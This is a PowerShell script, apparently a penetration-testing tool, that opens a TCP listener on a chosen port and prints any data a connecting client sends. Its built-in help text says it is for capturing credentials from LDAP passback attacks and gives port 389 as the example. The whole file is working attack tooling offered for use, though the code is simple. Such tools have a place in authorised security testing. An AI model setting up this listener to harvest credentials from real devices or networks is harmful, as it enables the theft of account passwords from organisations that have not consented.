param(
    [Parameter()]
    [int]$Port
)

if (-not $PSBoundParameters.ContainsKey('Port')) {
    Write-Host "PowerShell Passback Listener" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "A simple TCP listener that captures and displays incoming data." -ForegroundColor White
    Write-Host "Useful for capturing credentials from LDAP passback attacks or similar techniques." -ForegroundColor White
    Write-Host ""
    Write-Host "Usage:" -ForegroundColor Yellow
    Write-Host "  .\powershell_passback.ps1 -Port <port_number>" -ForegroundColor Green
    Write-Host ""
    Write-Host "Example:" -ForegroundColor Yellow
    Write-Host "  .\powershell_passback.ps1 -Port 389" -ForegroundColor Green
    Write-Host ""
    exit
}

Write-Host "Starting listener on port $Port..." -ForegroundColor Green
Write-Host "Press Ctrl+C to stop" -ForegroundColor Yellow
Write-Host ""

try {
    # Create TCP listener
    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $Port)
    $listener.Start()
    
    Write-Host "Waiting for connection..." -ForegroundColor Cyan
    
    # Accept incoming connection
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = [System.IO.StreamReader]::new($stream)
    $writer = [System.IO.StreamWriter]::new($stream)
    $writer.AutoFlush = $true
    
    $remoteEndpoint = $client.Client.RemoteEndPoint
    Write-Host "Connection from: $remoteEndpoint" -ForegroundColor Green
    Write-Host ""
    
    # Read and display incoming data
    $buffer = New-Object byte[] 4096
    while ($client.Connected) {
        if ($stream.DataAvailable) {
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -gt 0) {
                $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
                Write-Host $data -NoNewline
            }
        }
        Start-Sleep -Milliseconds 10
    }
}
catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
finally {
    # Cleanup
    if ($reader) { $reader.Close() }
    if ($writer) { $writer.Close() }
    if ($stream) { $stream.Close() }
    if ($client) { $client.Close() }
    if ($listener) { $listener.Stop() }
    Write-Host "`nListener stopped." -ForegroundColor Yellow

}
